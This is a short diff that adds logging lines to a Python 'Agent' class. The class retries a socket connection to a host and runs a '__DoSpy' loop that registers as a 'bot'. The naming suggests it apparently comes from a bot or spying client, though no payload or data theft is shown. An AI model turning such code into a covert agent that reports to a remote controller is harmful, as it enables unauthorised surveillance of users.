@@ -26,9 +26,10 @@ class Agent():
 
     @retry(wait_exponential_multiplier=1000, wait_exponential_max=600000)
     def __Connect(self):
-        self.l.debug("connecting to {}:{}".format(self.host, self.port))
+        self.l.debug("Connecting to {}:{}".format(self.host, self.port))
         self.__SetupSocket()
         self.socket.connect((self.host, self.port))
+        self.l.debug("Connection established.")
 
     def __ProcessReply(self, data):
         hex_data = haxorview(data)
@@ -72,6 +73,7 @@ class Agent():
 
     def __DoSpy(self):
         self.__SayHello()
+        self.l.info("Bot registered.")
         while True:
             try:
                 self.__Communicate()
